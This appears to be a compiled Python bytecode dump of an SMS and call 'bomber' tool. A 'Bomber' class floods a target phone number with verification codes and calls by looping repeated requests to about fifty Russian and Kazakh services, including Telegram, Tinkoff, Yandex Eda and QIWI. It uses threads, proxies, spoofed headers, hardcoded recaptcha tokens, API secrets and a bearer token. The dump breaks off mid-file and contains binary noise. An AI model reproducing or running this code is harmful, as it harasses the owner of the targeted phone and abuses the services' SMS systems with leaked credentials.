a
    �;�`O�  �                   @   s�   d dl Z d dlmZ d dlZd dlmZ d dlmZmZ d dl	Z	d dl
mZ d dlmZ g Zg Zg Zed�dd	�Zdd
d�Zd dd�Zd!dd�Zdd� Zd"eeeed�dd�ZG dd� d�Zdd� Zdd� Zdd� Zedkr�e�  dS )#�    N)�banner)�BeautifulSoup)�
user_agent�email)�sleep)�Thread)�returnc                   C   s   dddddt � dd�S )N�XMLHttpRequest�
keep-alive�no-cache�gzip, deflate, br�1��X-Requested-With�
ConnectionZPragmazCache-Control�Accept-Encoding�
User-AgentZDNT)r   � r   r   �main.py�default_headers   s    �r   c                 K   s8   z&t j| f|dd�|�dt� i�� W n   Y n0 d S �N�   )�headers�timeout�proxies)�requests�postr   ��linkr   �kwargsr   r   r   r      s    &r   c                 K   sB   z&t j| f|dd�|�dt� i�� W n t jjy<   Y n0 d S r   )r   �getr   �
exceptions�RequestExceptionr   r   r   r   r       s    &r    c                 K   sB   z&t j| f|dd�|�dt� i�� W n t jjy<   Y n0 d S r   )r   �putr   r!   r"   r   r   r   r   r#   %   s    &r#   c                 C   sH   dd� | D �}d} |D ]}| |7 } q| d d� dkrDd| dd �  S | S )Nc                 S   s   g | ]}|� � r|�qS r   )�isdigit)�.0�elemr   r   r   �
<listcomp>,   �    z phone_format.<locals>.<listcomp>� �   �8�7r   )�phone�	formattedr&   r   r   r   �phone_format+   s    
r/   �*)r-   �mask�mask_symbolr   c                 C   sH   d}|D ]:}||kr:|| d 7 }| t | �d d d � } q||7 }q|S )Nr)   r   r*   �����)�len)r-   r1   r2   Zformatted_phone�symbolr   r   r   �pformat4   s    
r6   c                   @   s�  e Zd Zedd�dd�Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd � Zd!d"� Zd#d$� Zd%d&� Zd'd(� Zd)d*� Zd+d,� Zd-d.� Zd/d0� Zd1d2� Zd3d4� Zd5d6� Zd7d8� Zd9d:� Zd;d<� Z d=d>� Z!d?d@� Z"dAdB� Z#dCdD� Z$dEdF� Z%dGdH� Z&dIdJ� Z'dKdL� Z(dMdN� Z)dOdP� Z*dQdR� Z+dSdT� Z,dUdV� Z-dWdX� Z.dYdZ� Z/d[d2� Zd\d]� Z0d^d_� Z1d`da� Z2dbdc� Z3ddde� Z4dfdg� Z5dhdi� Z6djdk� Z7dldm� Z8dndo� Z9dS )p�BomberN)r-   r   c                 C   s�   t jj��  || _td�}d�tj|dd��| _	d�tj|dd��| _
d�tj|dd��| _t� | _t �� | _| j� d�| _ddddd	d
dd�| _d S )NZ=123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNMr)   �   )�kz
@gmail.comr	   r
   r   r   z�Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36r   r   )r   ZpackagesZurllib3Zdisable_warningsr-   �list�join�random�choices�password�username�namer   r   �Session�sr   �android_headers)�selfr-   r@   r   r   r   �__init__@   s    
zBomber.__init__c                 C   s2   | j tv r.td| j ddd�| jd� td� q d S )NzVhttps://www.dns-shop.ru/order/order-single-page/check-and-initiate-phone-confirmation/r   r*   )r-   Z	is_repeatZ
order_guid��paramsr   �<   �r-   �phones_in_spamr   r   r   �rD   r   r   r   �dnsL   s    
z
Bomber.dnsc                 C   sH   | j tv rDtd�D ]&}tddd| j  i| jd� td� qtd� q d S )Nr   z!https://api.tinkoff.ru/v1/sign_upr-   �+��datar   rH   �  �r-   rJ   �ranger   r   r   �rD   �ir   r   r   �tinkoffQ   s
    

zBomber.tinkoffc                 C   s.   | j tv r*tdd| j i| jd� td� q d S )Nz=https://lenta.com/api/v1/authentication/requestValidationCoder-   ��jsonr   �x   rI   rK   r   r   r   �lentaX   s    
zBomber.lentac                 C   s:   | j tv r6tddd| j � �ddd�| jd� td� q d S )	Nz+https://mobile-api.qiwi.com/oauth/authorizez,urn:qiwi:oauth:response-type:confirmation-idrM   z
android-qwZzAm4FKq9UnSe7id)Zresponse_typer?   Z	client_idZclient_secretrN   �   )r-   rJ   r   rC   r   rK   r   r   r   �qiwi]   s    
"zBomber.qiwic                 C   s@   | j tv r<tddd| jddt| j d�ddd	�d
� td� q d S )Nz$https://zoloto585.ru/api/bcard/reg2/z
29.09.1981u   Москва�   Иванu   Иванович�+* (***) ***-**-**�mu   Иванов)Z	birthdate�cityr   r@   Z
patronymicr-   ZsexZsurname�rW   �,  )r-   rJ   r   r   r6   r   rK   r   r   r   �goldb   s    
(zBomber.goldc                 C   sH   | j tv rDtd�D ]&}tddd| j  i| jd� td� qtd� q d S )Nr   z*https://my.telegram.org/auth/send_passwordr-   rM   rN   rZ   rP   rQ   rS   r   r   r   �telegramg   s
    

zBomber.telegramc                 C   s2   | j tv r.tddd| j  i| jd� td� q d S )NzUhttps://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhonez
st.r.phonerM   rN   rH   rI   rK   r   r   r   �ok_run   s    
zBomber.ok_ruc                 C   s0   | j tv r,tdd| j iddid� td� q d S )Nz*https://youla.ru/web-api/auth/request_coder-   zX-Youla-Jsonz,{"lvid": "7e72ad9f2ff7840427bd772c0b630c71"}rN   rZ   �r-   rJ   r   r   rK   r   r   r   �youlas   s    
zBomber.youlac                 C   s.   | j tv r*tdd| j i| jd� td� q d S )Nz-https://dodopizza.kz/api/sendconfirmationcodeZphoneNumberrN   rH   rI   rK   r   r   r   �	dodopizzax   s    
zBomber.dodopizzac                 C   s6   | j tv r2tdd| j dd � i| jd� td� q d S )Nz)https://my.modulbank.ru/api/v2/auth/phoneZ	Cellphoner*   rV   rH   rI   rK   r   r   r   �	modulbank}   s    
zBomber.modulbankc                 C   s.   | j tv r*tdd| j i| jd� td� q d S )NzLhttps://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code�msisdnrF   r   rI   rK   r   r   r   �mtstv�   s    
zBomber.mtstvc                 C   sF   | j tv rBtd�D ]$}td| j � d�| jd� td� qtd� q d S )N�   z4https://www.citilink.ru/registration/confirm/phone/+�/�r   rH   rP   rQ   rS   r   r   r   �citylink�   s
    

zBomber.citylinkc                 C   s2   | j tv r.tddd| j  i| jd� td� q d S )Nz=https://eda.yandex.ru/api/v1/user/request_authentication_code�phone_numberrM   rV   rH   rI   rK   r   r   r   �	yandexeda�   s    
zBomber.yandexedac                 C   s0   | j tv r,tdd| j  dd�d� td� q d S )Nz5https://site-api.mcdonalds.ru/api/v1/user/login/phonerM   a�  03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V)Znumber�g-recaptcha-responser`   rH   re   rK   r   r   r   �	mcdonalds�   s    
zBomber.mcdonaldsc                 C   s4   | j tv r0td| j dd � dd�d� td� q d S )Nz https://rutaxi.ru/ajax_auth.htmlr*   �3)�l�c�rO   rP   re   rK   r   r   r   �rutaxi�   s    
zBomber.rutaxic                 C   s,   | j tv r(tdt| j d�d� td� q d S )NzAhttps://cash-u.com/main/rest/firstrequest/phone/confirmation/sendz* (***) ***-**-**:rv   rH   )r-   rJ   r   r6   r   rK   r   r   r   �cash_u�   s    
zBomber.cash_uc                 C   s*   | j tv r&tdd| j id� td� q d S )Nz�https://sbguest.sushibox.org/api/v1/users/webauthorization?api_token=QsWwXIIoVl6F0Zm0cnjRWnvPkEUMqqx66QHBmk3qe0kD7p2RWXzPsgIn2DfNr-   r`   �
   re   rK   r   r   r   �sushibox�   s    
zBomber.sushiboxc              	   C   sL   | j tv rHtd�D ]*}tdddddd| j  d�d	� td
� qtd� q d S )N�   z*https://api.papajohns.ru/user/confirm-code�ruz
web-mobiler   Zrecovery_passwordrM   )�lang�platformZcity_id�typer-   r`   �   rP   �r-   rJ   rR   r   r   rS   r   r   r   �papajons�   s
    

zBomber.papajonsc              	   C   s>   | j tv r:tdd ddt| j d�| j| jd�d� td� q d S )Nz https://pizzabox.ru/?action=auth�REGISTER�PHONEr]   )�CSRF�ACTIONZMODEr�   �PASSWORD�	PASSWORD2rv   rH   )r-   rJ   r   r6   r>   r   rK   r   r   r   �
pizzaboxru�   s    
&zBomber.pizzaboxruc                 C   s*   | j tv r&tdd| j id� td� q d S )Na,  https://my.drom.ru/sign/recover?return=https%3A%2F%2Fchelyabinsk.drom.ru%2Fauto%2Fall%2F%3Futm_source%3Dyandexdirect%26utm_medium%3Dcpc%26utm_campaign%3Ddrom_74_chelyabinsk_auto-rivals_alldevice_search_handmade%26utm_content%3Ddesktop_search_text_main%26utm_term%3D%25D0%25B0%25D0%25B2%25D1%2582%25D0%25BE%25D1%2580%25D1%2583%2520%25D1%2587%25D0%25B5%25D0%25BB%25D1%258F%25D0%25B1%25D0%25B8%25D0%25BD%25D1%2581%25D0%25BA%26_openstat%3DZGlyZWN0LnlhbmRleC5ydTsxNzY3NTA4MzsxOTMxNzMyNzE4O3lhbmRleC5ydTpwcmVtaXVt%26yclid%3D7777444668347802164%26tcb%3D1609147011�signrv   rH   re   rK   r   r   r   �dromru�   s    
zBomber.dromruc              
   C   sF   | j tv rBtddddddddd	�d
| j dd � d�d� td� q d S )Nz-https://moappsmapi.sportmaster.ru/api/v1/codeZ2dd9bfcfe18c2262z3.60.5(21555)ZANDROIDzSamsung SM-A205FN�9zmobileapp-android-9Z
Production)zX-SM-MobileAppzApp-VersionZOSzDevice-Modelz
OS-Versionr   z
Build-Moder-   r*   )r   �value�r   rW   �   re   rK   r   r   r   �sportmaster�   s    
.zBomber.sportmasterc                 C   sN   | j tv rJtd�D ],}dt| j d� d }td|d� td� qtd� q d S )	Nr   zrequest={"Body":{"Phone":"z+* *** ***-**-**a�  "},"Head":{"AdvertisingId":"3c725030-70c6-4945-8f75-69d1a5291793","AppsFlyerId":"1612665578706-4330044335349244143","AuthToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Client":"android_9_4.35.3","DeviceId":"3c725030-70c6-4945-8f75-69d1a5291793","MarketingPartnerKey":"mp30-5332b7f24ba54351047601d78f90dafbfd7fcc295f966d3af19aeb","SessionToken":"9FC2CF6CAB40F5BBCF6597AA9759D40B","Store":"utk","Theme":"dark","Username":"","Password":""}}z-https://www.utkonos.ru/api/v1/SendSmsAuthCode)rG   rH   rP   )r-   rJ   rR   r6   r    r   )rD   rT   Zpayloadr   r   r   �utkonos�   s    

zBomber.utkonosc                 C   sT   t d�D ]F}tdddd| j dd�d� td	� td
dd| j id� td	� qd S )Nr   �,https://rollserv.ru/user/NewUser/?async=json�2r\   rM   �on�r   z	ext[2][1]zuser[cellphone]zuser[i_agree]rv   rH   �$https://rollserv.ru/user/RestorePwd/�login)rR   r   r-   r   rS   r   r   r   �rollserv�   s
    zBomber.rollservc                 C   s.   | j tv r*tdd| j i| jd� td� q d S )Nz5https://lkdr.nalog.ru/api/v1/auth/challenge/sms/startr-   rV   rH   rI   rK   r   r   r   �nalog_ru�   s    
zBomber.nalog_ruc                 C   sv   | j tv rrzP| jjddd| j  i| j�d�jddddd	d
dddddddddddd�d� W n   Y n0 td� q d S )Nz2https://app.sberfood.ru/api/mobile/v3/auth/sendSmsZ	userPhonerM   z)https://app.sberfood.ru/auth?redirect=%2Fzapp.sberfood.rur
   Z28zhttps://app.sberfood.ruZWebz$Afisha, SplitOrder, ReferralCampaignzru-RU��Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 YaBrowser/19.6.1.153 Yowser/2.5 Safari/537.36zapplication/json;charset=UTF-8z!application/json, text/plain, */*z[object Object]z$6480ef6e-896e-4f59-8144-f3c14c87f88dz'WebApp-3a2605b0cf2a4c9d938752a84b7e97b6r   r   )�Hostr   zContent-Length�OriginZAppPlatformZFeatureszAccept-Languager   �Content-TypeZAccept�TokenZuseridZmridZAppKeyZ
AppVersion�Refererr   �rW   �cookiesr   rX   )r-   rJ   rB   r   r    r�   r   rK   r   r   r   �	sber_vkus�   s    
PzBomber.sber_vkusc                 C   sr   | j tv rnzLt| j�d�jd��d�d d }| jjdt| j d�|d�|d	d
�d� W n   Y n0 t	d� q d S )Nzhttps://broniboy.ru/moscow/�html.parser�meta[name=csrf-token]r   �contentz!https://broniboy.ru/ajax/send-smsr]   )r-   Z_csrfr	   )zX-CSRF-Tokenr   rN   r   )
r-   rJ   �BsrB   r    r�   �selectr   r6   r   )rD   �tokenr   r   r   �broniboy�   s    
"*zBomber.broniboyc                 C   sz   | j tv rvzT| jjd| jd� | jjdd d| jjd d| j dd � | j| j| jd�| jd	� W n   Y n0 t	d
� q d S )Nzhttps://anti-sushi.ru/rm   zhttps://anti-sushi.ru/?authr�   ZSIDr\   r*   )r�   r�   rA   �NAMEr�   ZEMAILr�   r�   rN   r�   )
r-   rJ   rB   r    r   r   r�   r   r>   r   rK   r   r   r   �
anti_sushi�   s    
BzBomber.anti_sushic                 C   s2   | j tv r.tdddi| j dd�d� td� q d S )Nz3https://bmp.megafon.tv/api/v10/auth/register/msisdnZ	SessionIDz+cj1lWg0n2IdD_gB-BPeZPejNflGdKzMjfWF1s9uldDQZ	123123112�ri   r>   )r�   rW   rH   re   rK   r   r   r   �
megafon_tv�   s    
zBomber.megafon_tvc              	   C   s<   | j tv r8tdddd�d| j dddd	�id
� td� q d S )Nz2https://loyalty-api.dixy.ru//api/v1/users/registerZ�eyJhcHBfdmVyc2lvbiI6IjIuMi4yKzMyMCIsImRldmljZSI6ImFuZHJvaWQiLCJkZXZpY2VfaWQiOiIyZGQ5YmZjZmUxOGMyMjYyIiwib3NfdmVyc2lvbiI6InNkazoyOCJ9Z�7b2f81beb3bc53c95ea7074b9be34b14ca1cb9e0aad355d9be3defb7df54072a64f172051582b9276db166c18c4f410ca21ca603f04e3765c971f590fb7b0c5d)Zappinfozdixy-api-token�user�androidZEnLcVjUZitTr   )r-   r~   Zsms_hashZloyalty_region_idr�   rH   re   rK   r   r   r   �dixy�   s    
$zBomber.dixyc                 C   s6   | j tv r2tdddd�d| j � d�d� td� q d S )	Nzhttps://api.zakazaka.ru/v1/r�   �0application/x-www-form-urlencoded; charset=UTF-8)r   r�   z}coord=56.02573402362801,36.78194995969534&app_version=android_395&device_id=16151140943779c51dc826104748b2e40f41410314&phone=z&action=profile.sms�r   rO   rH   re   rK   r   r   r   �
deliverycl�   s    
zBomber.deliveryclc                 C   s\   | j tv rXz6| jjd| jd� | jjdd| j i| jj| jd� W n   Y n0 td� q d S )Nzhttps://b-apteka.ru/lk/loginrm   z(https://b-apteka.ru/lk/send_confirm_coder-   r�   rH   )r-   rJ   rB   r    rC   r   r�   r   rK   r   r   r   �b_apteka�   s    
$zBomber.b_aptekac                 C   sT   t d�D ]F}tdddit| jd�ddd�d	d
dddddddd�	dd� td� qd S )N�   z"https://new-tel.net/ajax/a_api.phpr   �reg�+* (***) ***-****u   Хочу номерa�  03AGdBq26wF9vypkRRBWWA2uEFxzuYUhrdmyPDZhexuQ1OfK5uC3Taz-57K9Xg3AzTfnqZ8Mh6S0LLB816L-o5fAzH75pq7ukCPCTmypRVtVOF9s3SY-E-KJJtfuPLm5SgovqUQB2XASVHcdb13UEiCmUK5nPeVZ-l3EfxbsPV1ClYcHJVds9p4plFO277bYF1Plsm85g_oeYiw9nJif0ehee7FiPHvqAzmTmjTiSNSrodGQt52qEBkLQt1Y8wfGVq2J-BlWYz4j8OBiy7I_1yXMy-UZLMj4JTtDAqJB8oubTMzxHRVGPgW-bd-y_0QgOaHUYNQ3HWmp0OZcOzLciK_IW7JRI_fRArRWdkVq62bfq-yYhP5dwz4y_EHdg4ZnRusGODw0jEmt9HMWA0EaTXVfanN2sa-oU0NM8ttRdWQmgSPKJtF3sJm0WdjzkHfjquORz82dCctbXz)Zphone_nbro   r�   z.application/json, text/javascript, */*; q=0.01r   zru,en;q=0.9Z494r�   zhttps://new-tel.netz)https://new-tel.net/uslugi/call-password/r�   r	   )	Zacceptzaccept-encodingzaccept-languagezcontent-lengthzcontent-type�origin�refererz
user-agentzx-requested-withF)rG   rO   r   Zverifyr�   )rR   r   r6   r-   r   rS   r   r   r   �new_tel  s    :zBomber.new_telc                 C   s8   | j tv r4td�D ]}tdd| j id� td� qq d S )Nr   z4https://api.sunlight.net/v3/customers/authorization/r-   r`   rH   r�   rS   r   r   r   �sunlight  s    
zBomber.sunlightc              	   C   s8   | j tv r4td| j dddddd�| jd� td	� q d S )
Nz5https://www.icq.com/smsreg/requestPhoneValidation.php�enr|   r   Zic1rtwz1s1Hj1O0rZ46763)ri   �localeZcountryCode�versionr9   �rrN   r�   rI   rK   r   r   r   �icq  s    
 z
Bomber.icqc                 C   s*   | j tv r&tdd| j id� td� q d S )Nz1https://api.iconjob.co/api/auth/verification_coder-   r`   rH   re   rK   r   r   r   �	vk_rabota  s    
zBomber.vk_rabotac                 C   sH   | j tv rDz"td| j dd�t�d�jd� W n   Y n0 td� q d S )Nz3https://bmp.tv.yota.ru/api/v10/auth/register/msisdnZ123456r�   zhttps://tv.yota.ru/)rW   r�   rH   )r-   rJ   r   r   r    r�   r   rK   r   r   r   �yota  s    
"zBomber.yotac                 C   s0   | j tv r,tdd| j d�| jd� td� q d S )Nz$https://app.karusel.ru/api/v2/token/a�  03AGdBq27nU1tBT9kfCFtNRuu69Z2HZexs3nqTS1fxAScFvTOHs9XaEQujTEo8O6Wo1W3_QdxyFNl0BEpJue4sXqmoYVFM0EHSQTrdhtvb1exHUnEFMVwJRmP81DzNocYfMq4_qGSfB-ZI-2dz8EewhLnE_fps6ve2liRq5s8Gi_xFzFaU96vmJLp_AyIpcHLHYj2VUPK2R3Edw9k7-sTGj6tn1-Mf3zmeiViREVTYflibQUtQllEsTZnWTJtFFbeu83BNSZB4igHCDU3CtO-usjj-VQLEJaZf-lSKWE7I_c7S9atUy8tq2LbKczfHiOh2INJE6_wD0ILRTOsXWTK1JUVEAtzoZJ5hOo6LsAK98bEE7Cgsz5a-3-84eAHN7gs_pIEeadfimQ4apEu0MY--P_YCYcMU0bm__LFrFoYXEJfnBqjSgkOGUa7vnQJUBRmJkKqdbFzHim6PD4hciKP2AK3rFhGsWqhQuQ)Zrecaptcha_tokenr-   rV   r�   rI   rK   r   r   r   �karusel   s    
zBomber.karuselc                 C   s*   t ddd| jd| jdddd�| jd� d S )	NzHhttps://www.wildberries.ru/mobile/requestconfirmcode?forAction=EasyLogin�truer)   z%https%3A%2F%2Fwww.wildberries.ru%2FlkZfalser|   )z phoneInput.AgreeToReceiveSmsSpamzphoneInput.ConfirmCodezphoneInput.FullPhoneMobile�	returnUrlZphonemobileZagreeToReceiveSmsZshortSessionZperiodrN   )r   r-   r   rK   r   r   r   �wilberis%  s    zBomber.wilberisc              	   C   s�   | j jdd| j dd�ddid� | jtv r�td�D ]^}| j jd	i d
ddd��| j�d� | j jd	d| j dd�i d
ddd��| j�d� td� q4td� q"d S )Nz"https://b.utair.ru/api/v1/profile/rM   i0U�`)r-   ZconfirmationGDPRDateZauthorizationa�  Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyNzg0Iiwic2NvcGVzIjpbInVzZXIucHJvZmlsZSIsInVzZXIucHJvZmlsZS5lZGl0IiwidXNlci5wcm9maWxlLnJlcmVnaXN0cmF0aW9uIiwidXNlci5ib251cyIsInVzZXIucGF5bWVudHMuY2FyZHMiLCJ1c2VyLnJlZmVycmFscyIsInVzZXIuc3lzdGVtLmZlZWRiYWNrIiwidXNlci5jb21wYW55IiwidXNlci5leHBlcmVtZW50YWwucnpkIiwiYXBwLnVzZXIucmVnaXN0cmF0aW9uIiwiYXBwLmJvbnVzIiwiYXBwLmJvb2tpbmciLCJhcHAuY2hlY2tpbiIsImFwcC5haXJwb3J0cyIsImFwcC5jb3VudHJpZXMiLCJhcHAudG91cnMiLCJhcHAucHJvbW8iLCJhcHAuc2NoZWR1bGUiLCJhcHAucHJvbW8ucHJlcGFpZCIsImFwcC5zeXN0ZW0uZmVlZGJhY2siLCJhcHAuc3lzdGVtLnRyYW5zYWN0aW9ucyIsImFwcC5zeXN0ZW0ucHJvZmlsZSIsImFwcC5zeXN0ZW0udGVzdC5hY2NvdW50cyIsImFwcC5zeXN0ZW0ubGlua3MiLCJhcHAuc3lzdGVtLm5vdGlmaWNhdGlvbiIsImFwcC5kYWRhdGEiLCJhcHAuYWIiLCJhcHAuY29tcGFueSIsImFwcC5zZXJ2aWNlcyIsImFwcC5vcmRlcnMud2l0aGRyYXciLCJhcHAub3JkZXJzLnJlZnVuZCJdLCJleHAiOjE2NDU1ODQ1OTB9.a5uI-zyZVlXHU-bDr8rJ1UBGGjjaAHsSBw_YKg-cHMMrV   ry   z https://b.utair.ru/api/v1/login/zhttps://www.utair.ruz
b.utair.ruzhttps://www.utair.ru/)r�   r�   r�   rm   Z	call_code)r�   Zconfirmation_typerH   ih  )rB   r   r-   rJ   rR   �optionsr   r   rS   r   r   r   �utair(  s    "
"0
zBomber.utairc                 C   sH   | j tv rDtd�D ]&}tddd| j d�| jd� td� qtd� q d S )	Nrk   zJhttps://goods.ru/api/mobile/v1/securityService/extraAuthentication/keySendz$5888d4f4-bac1-4d47-8957-f0c7e8ee9866r   )r�   �contextr-   rV   �Z   rP   rQ   rS   r   r   r   �goods1  s
    

zBomber.goodsc                 C   sD   | j tv r@tddd| j d�d�i ddd��| j�d	� td
� q d S )N�https://www.ollis.ru/gql�nmutation sendPhone($domain:ID!,$phone:String!){phone(number:$phone,region:$domain){token error{code message}}}�spb��domainr-   ��queryZ	variablesz,https://www.ollis.ru/spb/actions/ollis-ukrop�https://www.ollis.ru)r�   r�   rV   r�   rI   rK   r   r   r   �olis:  s    
,zBomber.olisc                 C   sV   | j tv rRtdt| j d�d dd�i ddd��| j�tjd| jd	�jd
� td� q d S )Nz�https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp?pageName=loginByUserPhoneVerification&fromCheckout=false&fromRegisterPage=true&snLogin=&bpg=&snProviderId=z+* *** *******r�   )r-   rq   Z	recaptchazhttps://www.mvideo.ruzhttps://www.mvideo.ru/login�r�   r�   zhttps://www.mvideo.ru/rm   )rO   r   r�   r�   )	r-   rJ   r   r6   r   r   r    r�   r   rK   r   r   r   �mvideo?  s    
>zBomber.mvideoc                 C   sV   | j tv rRtdddidd| j  d�d� tdddidd| j  d	d
�d� td� q d S )Nz!https://my.sravni.ru/signin/checkz#.AspNetCore.Antiforgery.vnVzMy2Mv7Qz�CfDJ8IypALj00KFOjKLX4feRDQZSp6-Eg15CT7C8pqCF1cxanQrGsPbTYGecmprf-XGe0mzWzkI1G3cAzX8w1hv1BPQN2g3hemrutTWTtWCatfHIICsK6WSng7Wld93RzYLVZxO7-KadNmasMU-ah6uZYZQz�CfDJ8IypALj00KFOjKLX4feRDQbpNwntvfhdmSdYtqET2P_0rqpplNpaiBKYJxNK_lf--b7TUWWSq4fQjv7E5EeCxwciwoxbBcDPDRrV_fgYmgwPCSD7Z6wxekBfynac75GNzH5-HX7IFCNZzZcXwV2UCJUrM   )�__RequestVerificationTokenr�   )r�   rO   z https://my.sravni.ru/signin/codea.  /connect/authorize/callback?client_id=www&amp;redirect_uri=https%3A%2F%2Fwww.sravni.ru%2Fsignin-oidc%2F&amp;response_mode=form_post&amp;response_type=code%20id_token%20token&amp;scope=openid%20offline_access%20email%20phone%20profile%20roles%20Sravni.Reviews.Service%20Sravni.QnA.Service%20Sravni.FileStorage.Service%20Sravni.Memory.Service&amp;state=OpenIdConnect.AuthenticationProperties%3Dqct1SAIcQS4-GZTHW91VOcmkvDG4xqNtjPw9rcrhKx1Z9FT0C9Szk7XtNXwDnx4WJK-fPTJC9lwf7JlL6rZrhNRF5bKnvDkrR0qFSWhvd-h9MJHJJzrF26us2WqfG3qsp60HUMTNkqmh9xS6IIj8TQUT64GWOuRC8gNCEUzagg0wqxlAo9cmsedBcIp0s2J5rgR_vstD6j0A9wI9EAHdsUdpKdgdUJ_Sh6eu_OmBgnA1rFPT&amp;nonce=637581300907406470.NTcxYzYyMGItMmViYS00ZDJkLThmOTAtN2ZhYjE1NDYxZGE4M2ZlZmEwNzItYzA1YS00YzgwLTkxMGEtN2ZlODdjNDU4NjNk&amp;x-client-SKU=ID_NET&amp;x-client-ver=1.0.40306.1554)r�   r-   r�   r�   re   rK   r   r   r   �	sravni_ruD  s    
 zBomber.sravni_ruc              	   C   s�   t dddd| j dd�ddd	�i d
dd��| j�d� | jtv r|t ddd| j iddd	�i d
ddd��| j�d� td� q6d S )Nr�   r�   r\   rM   r�   r�   Z 566f53f4ebbc50c7316e3db6c5775097r�   )Z	PHPSESSIDZOrderCallExpandzhttps://rollserv.ruzhttps://rollserv.ru/r�   �rO   r�   r   r�   r�   z"https://rollserv.ru/user/password/r   )r�   r�   zupgrade-insecure-requests)rO   Zookiesr   �2   )r   r-   r   rJ   r   rK   r   r   r   r�   J  s    6
2c                 C   s8   | j tv r4tdt| j d�ddd�| jd� td� q d S )Nz&https://taxovichkof.ru/api/userSendSmsr�   r|   r�   )r?   r}   r_   rN   ra   )r-   rJ   r   r6   r   r   rK   r   r   r   �taxovichkofP  s    
 zBomber.taxovichkofc                 C   sv   | j tv rrzP| jjdi dt| j�d�jd��d�d d i�| j�t	| j d�d	d
�d� W n   Y n0 t
d� q d S )Nz&https://emenu.kz/auth/auth/verify-codezx-csrf-tokenzhttps://emenu.kz/signupr�   r�   r   r�   r]   Zregistration)r-   r   r�   rH   )r-   rJ   rB   r   r�   r    r�   r�   r   r6   r   rK   r   r   r   �emenuU  s    
PzBomber.emenuc                 C   sF   | j tv rBtd| j ddd�ddii ddd	��| j�d
� td� q d S )Nz'https://sso.garena.com/api/send_sms_otprW   Z1622616432977)Z	mobile_no�format�idZGOPZ 965a379c113a1f2bb5560a247353ef53zsso.garena.comzhttps://sso.garena.com)r�   r�   r�   rH   rI   rK   r   r   r   �garena]  s    
.zBomber.garenac                 C   sh   | j tv rdzB| jjdt| j�d�jd��d�d d d| j  d�| jd	� W n   Y n0 t	d
� q d S )Nz,https://lk.belkacar.ru/get-confirmation-codezhttps://lk.belkacar.ru/loginr�   zinput[name=_token]r   r�   rM   )Z_tokenr-   rN   rH   )
r-   rJ   rB   r   r�   r    r�   r�   r   r   rK   r   r   r   �belkacarb  s    
BzBomber.belkacarc                 C   sD   | j tv r@tddd| j d�d�i | j�ddd��d	� td
� q d S )Nr�   r�   r�   r�   r�   r�   zhttps://www.ollis.ru/spb/r�   rV   rH   rI   rK   r   r   r   �ollisj  s    
,zBomber.ollisc              
   C   sF   | j tv rBtdt| j dd � d�t� dd dddd�d� td	� q d S )
N�https://www.lensmaster.ru/r*   �8 (***) ***-****�Y�project:auth-and-reg-extr�   )r-   r   �ajax�template�	component�sendForm�actionrv   rH   �r-   rJ   r   r6   r   r   rK   r   r   r   �lensmaster_callo  s    
.zBomber.lensmaster_callc                 C   sH   | j tv rDtdd t| j dd � d�t� dd dddd�d� td	� q d S )
Nr�   r*   r�   r�   r�   z	reg-new-2)�coder-   r   r�   r�   r�   r�   r�   rv   �   r�   rK   r   r   r   �lensmaster_smst  s    
0zBomber.lensmaster_smsc                 C   s@   | j tv r<tdi ddi�| j�dd| j dd�d� td� q d S )	Nz)https://api.crm.p-group.ru/checkout/loginz	x-keypassz!lebfgiuDaeEYiou2%3255$208@{wdw{]}r�   Z321)ZdepartmentIdZregionIdr-   ZrecaptchaTokenr�   rH   rI   rK   r   r   r   �
lvlkitcheny  s    
(zBomber.lvlkitchenc                 C   s6   | j | j| jg}|D ]}t|dd���  td� qd S )NF��target�daemonr�   )r�   r�   r�   r   �startr   �rD   Zservices�functionr   r   r   �call~  s    zBomber.callc              0   C   s�   | j | j| j| j| j| j| j| j| j| j| j	| j
| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j| j | j!| j"| j#| j| j$| j%| j&| j'| j(| j)| j*| j+| j,| j-g0}|D ]}t.|dd��/�  t0d� q�d S )NFr�   r*   )1r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rL   rY   rU   r[   rb   rd   rc   rf   rg   rj   rh   rp   rn   rw   rr   rx   rz   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r   r�   r   r�   r   r   r   �rus�  s    �z
Bomber.rus):�__name__�
